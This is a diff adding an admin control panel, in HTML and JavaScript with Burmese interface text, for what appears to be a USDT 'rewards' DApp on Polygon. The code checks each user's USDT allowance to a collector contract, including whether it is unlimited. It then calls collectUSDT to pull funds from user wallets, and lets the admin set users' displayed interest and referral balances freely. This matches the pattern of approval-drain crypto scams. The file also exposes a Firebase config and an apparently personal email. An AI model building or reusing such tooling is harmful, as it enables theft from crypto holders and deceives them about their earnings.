@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Control Panel - USDT Rewards DApp</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+</head>
+<body class="bg-slate-950 text-white min-h-screen p-4 text-sm">
+
+    <!-- LOGIN SECTION -->
+    <div id="loginBox" class="max-w-md mx-auto mt-16 bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-2xl">
+        <div class="text-center mb-5">
+            <h1 class="text-xl font-bold text-emerald-400">Admin Panel Login</h1>
+            <p class="text-xs text-slate-400 mt-1">Firebase Admin Email & Password ဖြင့် ဝင်ရောက်ပါ</p>
+        </div>
+
+        <form id="adminLoginForm" class="space-y-4">
+            <div>
+                <label class="block text-xs text-slate-400 mb-1">Admin Email</label>
+                <input type="email" id="adminEmail" required placeholder="aunghtet668866@gmail.com" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
+            </div>
+            <div>
+                <label class="block text-xs text-slate-400 mb-1">Password</label>
+                <input type="password" id="adminPassword" required placeholder="••••••••" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
+            </div>
+            <div id="loginError" class="hidden text-xs text-red-400 bg-red-950/50 border border-red-500/30 p-2.5 rounded-lg"></div>
+            <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 font-semibold py-2.5 rounded-xl transition cursor-pointer">
+                Sign In to Admin Panel
+            </button>
+        </form>
+    </div>
+
+    <!-- MAIN ADMIN DASHBOARD -->
+    <div id="adminDashboard" class="hidden max-w-5xl mx-auto space-y-6 pb-12">
+
+        <!-- TOP BAR -->
+        <div class="bg-slate-900 border border-slate-800 p-4 rounded-2xl flex flex-wrap items-center justify-between gap-3">
+            <div>
+                <h1 class="text-base md:text-lg font-bold text-emerald-400">USDT Rewards Admin Dashboard</h1>
+                <p id="adminInfoText" class="text-xs text-slate-400 font-mono">Logged in</p>
+            </div>
+            <div class="flex flex-wrap items-center gap-2">
+                <button id="connectAdminWalletBtn" onclick="connectAdminWallet()" class="bg-blue-600 hover:bg-blue-500 px-3.5 py-2 rounded-xl text-xs font-semibold cursor-pointer">
+                    Connect Admin Wallet
+                </button>
+                <button onclick="logoutAdmin()" class="bg-slate-800 hover:bg-red-600/80 border border-slate-700 px-3.5 py-2 rounded-xl text-xs font-semibold cursor-pointer">
+                    Logout
+                </button>
+            </div>
+        </div>
+
+        <!-- SUMMARY CARDS -->
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+            <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl">
+                <p class="text-xs text-slate-400">Pending Requests</p>
+                <p id="statPendingCount" class="text-xl font-bold font-mono text-amber-400 mt-1">0</p>
+            </div>
+            <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl">
+                <p class="text-xs text-slate-400">Registered Users</p>
+                <p id="statUsersCount" class="text-xl font-bold font-mono text-emerald-400 mt-1">0</p>
+            </div>
+            <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl">
+                <p class="text-xs text-slate-400">Pending Withdraws</p>
+                <p id="statWithdrawCount" class="text-xl font-bold font-mono text-purple-400 mt-1">0</p>
+            </div>
+            <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl">
+                <p class="text-xs text-slate-400">Pending Pledges</p>
+                <p id="statPledgeCount" class="text-xl font-bold font-mono text-cyan-400 mt-1">0</p>
+            </div>
+        </div>
+
+        <!-- STATUS LOG -->
+        <div id="adminStatusLog" class="hidden bg-slate-900 border border-amber-500/30 text-amber-300 px-4 py-2.5 rounded-xl text-xs font-mono"></div>
+
+        <!-- TABS -->
+        <div class="flex gap-2 border-b border-slate-800 pb-2">
+            <button id="tabPendingBtn" onclick="switchTab('pending')" class="bg-emerald-600 text-white px-4 py-2 rounded-xl text-xs font-semibold cursor-pointer">
+                Pending Notifications
+            </button>
+            <button id="tabHistoryBtn" onclick="switchTab('history')" class="bg-slate-900 text-slate-300 hover:bg-slate-800 px-4 py-2 rounded-xl text-xs font-semibold cursor-pointer">
+                All Logs / Register Alerts
+            </button>
+            <button id="tabUsersBtn" onclick="switchTab('users')" class="bg-slate-900 text-slate-300 hover:bg-slate-800 px-4 py-2 rounded-xl text-xs font-semibold cursor-pointer">
+                Users Management
+            </button>
+        </div>
+
+        <!-- PENDING REQUESTS LIST -->
+        <div id="sectionPending" class="space-y-3">
+            <div id="pendingListContainer" class="space-y-3">
+                <div class="text-slate-400 text-center py-8 bg-slate-900 rounded-2xl border border-slate-800">Loading requests...</div>
+            </div>
+        </div>
+
+        <!-- HISTORY / REGISTER NOTIFICATIONS LIST -->
+        <div id="sectionHistory" class="hidden space-y-3">
+            <div id="historyListContainer" class="space-y-3"></div>
+        </div>
+
+        <!-- USERS LIST -->
+        <div id="sectionUsers" class="hidden space-y-3">
+            <div id="usersListContainer" class="space-y-3"></div>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyB3COHmJSiUcyIXuC7ww4oHkyxkJ9a5xMA",
+            authDomain: "usdt-rewards-dapp.firebaseapp.com",
+            projectId: "usdt-rewards-dapp",
+            storageBucket: "usdt-rewards-dapp.firebasestorage.app",
+            messagingSenderId: "867523362805",
+            appId: "1:867523362805:web:295a276b611092cb0c2abc"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";
+        const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
+        const POLYGON_RPC = "https://polygon-rpc.com";
+
+        const ERC20_ABI = [
+            "function allowance(address owner, address spender) view returns (uint256)",
+            "function balanceOf(address account) view returns (uint256)"
+        ];
+
+        const COLLECTOR_ABI = [
+            "function collectUSDT(address from, uint256 amount) external"
+        ];
+
+        const readProvider = new ethers.JsonRpcProvider(POLYGON_RPC);
+        let adminWalletProvider = null;
+        let adminWalletSigner = null;
+        let adminWalletAddress = null;
+        let unsubRequests = null;
+        let unsubUsers = null;
+
+        function escapeHtml(str) {
+            return String(str ?? "").replace(/[&<>"']/g, (m) => ({
+                "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
+            }[m]));
+        }
+
+        function setAdminLog(msg) {
+            const el = document.getElementById("adminStatusLog");
+            el.classList.remove("hidden");
+            el.innerText = msg;
+        }
+
+        function formatTime(ts) {
+            if (!ts || typeof ts.toDate !== "function") return "Just now";
+            return ts.toDate().toLocaleString();
+        }
+
+        function getCreatedAtMs(item) {
+            const ts = item?.createdAt;
+            if (ts && typeof ts.toMillis === "function") return ts.toMillis();
+            if (typeof ts === "number") return ts;
+            return 0;
+        }
+
+        // AUTHENTICATION
+        document.getElementById("adminLoginForm").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const email = document.getElementById("adminEmail").value.trim();
+            const password = document.getElementById("adminPassword").value;
+            const errBox = document.getElementById("loginError");
+            errBox.classList.add("hidden");
+
+            try {
+                await auth.signInWithEmailAndPassword(email, password);
+            } catch (err) {
+                errBox.innerText = "Login မအောင်မြင်ပါ: " + (err.message || "Invalid credentials");
+                errBox.classList.remove("hidden");
+            }
+        });
+
+        auth.onAuthStateChanged((user) => {
+            if (user) {
+                document.getElementById("loginBox").classList.add("hidden");
+                document.getElementById("adminDashboard").classList.remove("hidden");
+                document.getElementById("adminInfoText").innerText = `Admin: ${user.email} (UID: ${user.uid.slice(0, 8)}...)`;
+                startRealtimeListeners();
+            } else {
+                if (unsubRequests) unsubRequests();
+                if (unsubUsers) unsubUsers();
+                document.getElementById("adminDashboard").classList.add("hidden");
+                document.getElementById("loginBox").classList.remove("hidden");
+            }
+        });
+
+        async function logoutAdmin() {
+            await auth.signOut();
+        }
+
+        // ADMIN WEB3 WALLET (for executing collectUSDT)
+        async function connectAdminWallet() {
+            if (typeof window.ethereum === "undefined") {
+                alert("MetaMask သို့မဟုတ် Web3 Wallet မတွေ့ပါ။");
+                return;
+            }
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: "0x89" }]
+                });
+                adminWalletProvider = new ethers.BrowserProvider(window.ethereum);
+                const accounts = await adminWalletProvider.send("eth_requestAccounts", []);
+                adminWalletAddress = ethers.getAddress(accounts[0]);
+                adminWalletSigner = await adminWalletProvider.getSigner();
+
+                const btn = document.getElementById("connectAdminWalletBtn");
+                btn.innerText = `Wallet: ${adminWalletAddress.slice(0, 6)}...${adminWalletAddress.slice(-4)}`;
+                btn.className = "bg-emerald-600 px-3.5 py-2 rounded-xl text-xs font-semibold";
+                setAdminLog(`Admin Wallet (${adminWalletAddress}) ချိတ်ဆက်ပြီးပါပြီ။`);
+            } catch (err) {
+                alert("Admin Wallet ချိတ်ဆက်မှု မအောင်မြင်ပါ: " + (err.message || ""));
+            }
+        }
+
+        // TABS
+        function switchTab(tab) {
+            const sections = {
+                pending: document.getElementById("sectionPending"),
+                history: document.getElementById("sectionHistory"),
+                users: document.getElementById("sectionUsers")
+            };
+            const buttons = {
+                pending: document.getElementById("tabPendingBtn"),
+                history: document.getElementById("tabHistoryBtn"),
+                users: document.getElementById("tabUsersBtn")
+            };
+
+            Object.keys(sections).forEach((k) => {
+                sections[k].classList.toggle("hidden", k !== tab);
+                buttons[k].className = k === tab
+                    ? "bg-emerald-600 text-white px-4 py-2 rounded-xl text-xs font-semibold cursor-pointer"
+                    : "bg-slate-900 text-slate-300 hover:bg-slate-800 px-4 py-2 rounded-xl text-xs font-semibold cursor-pointer";
+            });
+        }
+
+        function applyRequestsData(docsArray) {
+            const pendingItems = [];
+            const allItems = [];
+            let pendingWithdraw = 0;
+            let pendingPledge = 0;
+
+            docsArray.forEach((item) => {
+                allItems.push(item);
+                if (item.status === "pending") {
+                    pendingItems.push(item);
+                    if (item.type === "withdraw") pendingWithdraw++;
+                    if (item.type === "pledge") pendingPledge++;
+                }
+            });
+
+            allItems.sort((a, b) => getCreatedAtMs(b) - getCreatedAtMs(a));
+            pendingItems.sort((a, b) => getCreatedAtMs(b) - getCreatedAtMs(a));
+
+            document.getElementById("statPendingCount").innerText = pendingItems.length;
+            document.getElementById("statWithdrawCount").innerText = pendingWithdraw;
+            document.getElementById("statPledgeCount").innerText = pendingPledge;
+
+            renderPendingRequests(pendingItems);
+            renderHistoryRequests(allItems);
+        }
+
+        function applyUsersData(usersArray) {
+            usersArray.sort((a, b) => getCreatedAtMs(b) - getCreatedAtMs(a));
+            document.getElementById("statUsersCount").innerText = usersArray.length;
+            renderUsersList(usersArray);
+        }
+
+        async function loadInitialFirestoreData() {
+            try {
+                const [reqSnap, usersSnap] = await Promise.all([
+                    db.collection("approval_requests").limit(150).get(),
+                    db.collection("users").limit(200).get()
+                ]);
+
+                const reqDocs = [];
+                reqSnap.forEach((doc) => reqDocs.push({ id: doc.id, ...doc.data() }));
+                applyRequestsData(reqDocs);
+
+                const userDocs = [];
+                usersSnap.forEach((doc) => userDocs.push({ id: doc.id, ...doc.data() }));
+                applyUsersData(userDocs);
+            } catch (err) {
+                console.error("Initial load error:", err);
+                setAdminLog("⚠️ Data ဖတ်ယူမှု error: " + (err.message || err));
+                renderPendingRequests([]);
+            }
+        }
+
+        // REALTIME + INITIAL FIRESTORE LISTENERS
+        function startRealtimeListeners() {
+            loadInitialFirestoreData();
+
+            unsubRequests = db.collection("approval_requests")
+                .limit(150)
+                .onSnapshot((snapshot) => {
+                    const reqDocs = [];
+                    snapshot.forEach((doc) => reqDocs.push({ id: doc.id, ...doc.data() }));
+                    applyRequestsData(reqDocs);
+                }, (err) => {
+                    console.error("Requests listener error:", err);
+                    setAdminLog("⚠️ Firestore permission error: Admin UID ကို Firestore Rules တွင် မှန်ကန်စွာ ထည့်သွင်းထားကြောင်း စစ်ဆေးပါ။");
+                });
+
+            unsubUsers = db.collection("users")
+                .limit(200)
+                .onSnapshot((snapshot) => {
+                    const userDocs = [];
+                    snapshot.forEach((doc) => userDocs.push({ id: doc.id, ...doc.data() }));
+                    applyUsersData(userDocs);
+                }, (err) => {
+                    console.error("Users listener error:", err);
+                });
+        }
+
+        // RENDER FUNCTIONS
+        function renderPendingRequests(items) {
+            const container = document.getElementById("pendingListContainer");
+            if (items.length === 0) {
+                container.innerHTML = `<div class="text-slate-400 text-center py-8 bg-slate-900 rounded-2xl border border-slate-800">လက်ရှိ Pending Request မရှိသေးပါ။</div>`;
+                return;
+            }
+
+            container.innerHTML = items.map((item) => {
+                const badgeColor = item.type === "pledge"
+                    ? "bg-cyan-500/20 text-cyan-300 border-cyan-500/40"
+                    : "bg-purple-500/20 text-purple-300 border-purple-500/40";
+
+                const collectBtn = item.type === "pledge"
+                    ? `<button onclick="collectFromUserContract('${escapeHtml(item.id)}', '${escapeHtml(item.walletAddress)}', ${Number(item.amount || 0)})" class="bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-bold px-3 py-1.5 rounded-lg text-xs cursor-pointer">Collect USDT & Approve</button>`
+                    : "";
+
+                return `
+                <div class="bg-slate-900 border border-slate-800 p-4 rounded-2xl flex flex-col md:flex-row md:items-center justify-between gap-4">
+                    <div class="space-y-1.5">
+                        <div class="flex flex-wrap items-center gap-2">
+                            <span class="uppercase px-2.5 py-0.5 rounded-full text-xs font-bold border ${badgeColor}">${escapeHtml(item.type)}</span>
+                            <span class="font-mono text-xs text-slate-400">ID: ${escapeHtml(item.userId || "---")}</span>
+                            <span class="text-xs text-slate-500">${escapeHtml(formatTime(item.createdAt))}</span>
+                        </div>
+                        <p class="font-mono text-xs text-slate-200 break-all">Wallet: ${escapeHtml(item.walletAddress)}</p>
+                        <p class="font-mono text-sm font-bold text-emerald-400">Amount: ${Number(item.amount || 0).toFixed(6)} USDT</p>
+                        <div id="liveCheck_${escapeHtml(item.id)}" class="text-xs text-slate-400 font-mono"></div>
+                    </div>
+
+                    <div class="flex flex-wrap items-center gap-2 shrink-0">
+                        <button onclick="checkOnChainStatus('${escapeHtml(item.id)}', '${escapeHtml(item.walletAddress)}')" class="bg-slate-800 hover:bg-slate-700 border border-slate-700 px-3 py-1.5 rounded-lg text-xs cursor-pointer">
+                            Check Balance/Allowance
+                        </button>
+                        ${collectBtn}
+                        <button onclick="updateRequestStatus('${escapeHtml(item.id)}', 'approved')" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded-lg text-xs font-semibold cursor-pointer">
+                            Approve
+                        </button>
+                        <button onclick="updateRequestStatus('${escapeHtml(item.id)}', 'rejected')" class="bg-red-600/80 hover:bg-red-500 px-3 py-1.5 rounded-lg text-xs font-semibold cursor-pointer">
+                            Reject
+                        </button>
+                    </div>
+                </div>`;
+            }).join("");
+        }
+
+        function renderHistoryRequests(items) {
+            const container = document.getElementById("historyListContainer");
+            if (items.length === 0) {
+                container.innerHTML = `<div class="text-slate-400 text-center py-8 bg-slate-900 rounded-2xl border border-slate-800">မှတ်တမ်း မရှိသေးပါ။</div>`;
+                return;
+            }
+
+            container.innerHTML = items.map((item) => {
+                const statusColor = item.status === "approved"
+                    ? "text-emerald-400"
+                    : item.status === "rejected"
+                        ? "text-red-400"
+                        : "text-amber-400";
+                const extra = item.type === "register"
+                    ? `Auto-Approved Register (ID: ${escapeHtml(item.userId || "---")})`
+                    : `Amount: ${Number(item.amount || 0).toFixed(6)} USDT`;
+
+                return `
+                <div class="bg-slate-900 border border-slate-800 p-3.5 rounded-xl flex flex-wrap items-center justify-between gap-2 text-xs">
+                    <div class="space-y-1">
+                        <div class="flex items-center gap-2">
+                            <span class="uppercase font-bold text-slate-200">${escapeHtml(item.type)}</span>
+                            <span class="font-semibold ${statusColor}">[${escapeHtml(item.status)}]</span>
+                            <span class="text-slate-500">${escapeHtml(formatTime(item.createdAt))}</span>
+                        </div>
+                        <p class="font-mono text-slate-300 break-all">${escapeHtml(item.walletAddress)}</p>
+                        <p class="font-mono text-slate-400">${extra}</p>
+                    </div>
+                </div>`;
+            }).join("");
+        }
+
+        function renderUsersList(users) {
+            const container = document.getElementById("usersListContainer");
+            if (users.length === 0) {
+                container.innerHTML = `<div class="text-slate-400 text-center py-8 bg-slate-900 rounded-2xl border border-slate-800">User မရှိသေးပါ။</div>`;
+                return;
+            }
+
+            container.innerHTML = users.map((u) => {
+                const isBanned = u.status === "banned";
+                return `
+                <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl flex flex-col md:flex-row md:items-center justify-between gap-3 text-xs">
+                    <div class="space-y-1">
+                        <div class="flex items-center gap-2">
+                            <span class="font-bold text-white font-mono">${escapeHtml(u.userId || "---")}</span>
+                            <span class="px-2 py-0.5 rounded-full ${isBanned ? "bg-red-500/20 text-red-400" : "bg-emerald-500/20 text-emerald-400"}">${escapeHtml(u.status || "approved")}</span>
+                        </div>
+                        <p class="font-mono text-slate-300 break-all">${escapeHtml(u.walletAddress)}</p>
+                        <p class="font-mono text-slate-400">Interest: ${Number(u.interestBalance || 0).toFixed(4)} | Referral: ${Number(u.referralBalance || 0).toFixed(4)} | Locked: ${Number(u.lockedBalance || 0).toFixed(4)}</p>
+                    </div>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="editUserBalances('${escapeHtml(u.walletAddress)}', ${Number(u.interestBalance || 0)}, ${Number(u.referralBalance || 0)}, ${Number(u.lockedBalance || 0)})" class="bg-blue-600 hover:bg-blue-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">
+                            Edit Balances
+                        </button>
+                        <button onclick="toggleBanUser('${escapeHtml(u.walletAddress)}', ${isBanned})" class="${isBanned ? "bg-emerald-600 hover:bg-emerald-500" : "bg-red-600/80 hover:bg-red-500"} px-3 py-1.5 rounded-lg font-semibold cursor-pointer">
+                            ${isBanned ? "Unban" : "Ban User"}
+                        </button>
+                    </div>
+                </div>`;
+            }).join("");
+        }
+
+        // ADMIN ACTIONS
+        async function checkOnChainStatus(reqId, walletAddr) {
+            const target = document.getElementById(`liveCheck_${reqId}`);
+            if (target) target.innerText = "Checking Polygon USDT balance & allowance...";
+            try {
+                const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, readProvider);
+                const [bal, allow] = await Promise.all([
+                    usdt.balanceOf(walletAddr),
+                    usdt.allowance(walletAddr, COLLECTOR_CONTRACT_ADDRESS)
+                ]);
+                const balFmt = Number(ethers.formatUnits(bal, 6)).toFixed(6);
+                const allowFmt = allow > ethers.parseUnits("1000000000", 6)
+                    ? "Unlimited"
+                    : Number(ethers.formatUnits(allow, 6)).toFixed(6);
+
+                if (target) {
+                    target.innerText = `Live Wallet USDT: ${balFmt} | Approved Allowance: ${allowFmt}`;
+                }
+            } catch (err) {
+                if (target) target.innerText = "On-chain check failed: " + (err.message || "");
+            }
+        }
+
+        async function updateRequestStatus(reqId, newStatus) {
+            if (!confirm(`ဤ Request ကို "${newStatus.toUpperCase()}" အဖြစ် ပြောင်းလဲမည်လား?`)) return;
+            try {
+                await db.collection("approval_requests").doc(reqId).update({
+                    status: newStatus,
+                    reviewedBy: auth.currentUser?.email || "admin",
+                    reviewedAt: firebase.firestore.FieldValue.serverTimestamp(),
+                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+                setAdminLog(`Request (${reqId}) ကို ${newStatus} လုပ်ပြီးပါပြီ။`);
+                await loadInitialFirestoreData();
+            } catch (err) {
+                alert("Update မအောင်မြင်ပါ: " + (err.message || ""));
+            }
+        }
+
+        async function collectFromUserContract(reqId, userWallet, amountUsdt) {
+            if (!adminWalletSigner) {
+                alert("Contract မှတစ်ဆင့် USDT လွှဲပြောင်းရယူရန် အပေါ်မှ 'Connect Admin Wallet' ကို အရင်နှိပ်ပါ။");
+                return;
+            }
+            if (!confirm(`User (${userWallet}) ထံမှ ${amountUsdt.toFixed(6)} USDT ကို Contract (collectUSDT) ဖြင့် လွှဲပြောင်းရယူပြီး Approve လုပ်မည်လား?`)) {
+                return;
+            }
+
+            try {
+                setAdminLog("Contract collectUSDT transaction ပို့နေပါသည်...");
+                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, adminWalletSigner);
+                const rawAmount = ethers.parseUnits(Number(amountUsdt).toFixed(6), 6);
+                const tx = await collector.collectUSDT(userWallet, rawAmount);
+                const receipt = await tx.wait();
+
+                await db.collection("approval_requests").doc(reqId).update({
+                    status: "approved",
+                    collectTxHash: receipt?.hash || tx?.hash || "",
+                    reviewedBy: auth.currentUser?.email || "admin",
+                    reviewedAt: firebase.firestore.FieldValue.serverTimestamp(),
+                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+
+                const userRef = db.collection("users").doc(userWallet.toLowerCase());
+                await db.runTransaction(async (t) => {
+                    const snap = await t.get(userRef);
+                    const prevLocked = snap.exists ? Number(snap.data().lockedBalance || 0) : 0;
+                    t.set(userRef, {
+                        lockedBalance: Number((prevLocked + Number(amountUsdt)).toFixed(6)),
+                        updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                    }, { merge: true });
+                });
+
+                setAdminLog(`✅ Collect USDT အောင်မြင်ပါပြီ! Tx: ${receipt?.hash || tx?.hash}`);
+                await loadInitialFirestoreData();
+            } catch (err) {
+                console.error(err);
+                alert("Collect USDT မအောင်မြင်ပါ: " + (err.reason || err.message || ""));
+            }
+        }
+
+        async function editUserBalances(walletAddr, curInterest, curRef, curLocked) {
+            const newInterest = prompt("Interest Balance (USDT) အသစ်ထည့်ပါ:", curInterest);
+            if (newInterest === null) return;
+            const newRef = prompt("Referral Balance (USDT) အသစ်ထည့်ပါ:", curRef);
+            if (newRef === null) return;
+            const newLocked = prompt("Locked Balance (USDT) အသစ်ထည့်ပါ:", curLocked);
+            if (newLocked === null) return;
+
+            const iVal = Number(newInterest);
+            const rVal = Number(newRef);
+            const lVal = Number(newLocked);
+            if (![iVal, rVal, lVal].every((n) => Number.isFinite(n) && n >= 0)) {
+                alert("ဂဏန်းတန်ဖိုး မှန်ကန်စွာ ထည့်ပါ။");
+                return;
+            }
+
+            try {
+                await db.collection("users").doc(walletAddr.toLowerCase()).set({
+                    interestBalance: Number(iVal.toFixed(6)),
+                    referralBalance: Number(rVal.toFixed(6)),
+                    lockedBalance: Number(lVal.toFixed(6)),
+                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                }, { merge: true });
+                setAdminLog(`User (${walletAddr}) ၏ Balance များကို ပြင်ဆင်ပြီးပါပြီ။`);
+                await loadInitialFirestoreData();
+            } catch (err) {
+                alert("Balance ပြင်ဆင်မှု မအောင်မြင်ပါ: " + (err.message || ""));
+            }
+        }
+
+        async function toggleBanUser(walletAddr, currentlyBanned) {
+            const nextStatus = currentlyBanned ? "approved" : "banned";
+            if (!confirm(`User (${walletAddr}) ကို "${nextStatus}" ပြောင်းလဲမည်လား?`)) return;
+            try {
+                await db.collection("users").doc(walletAddr.toLowerCase()).set({
+                    status: nextStatus,
+                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                }, { merge: true });
+                setAdminLog(`User (${walletAddr}) status ကို ${nextStatus} ပြောင်းပြီးပါပြီ။`);
+                await loadInitialFirestoreData();
+            } catch (err) {
+                alert("Status ပြောင်းလဲမှု မအောင်မြင်ပါ: " + (err.message || ""));
+            }
+        }
+    </script>
+</body>
+</html>
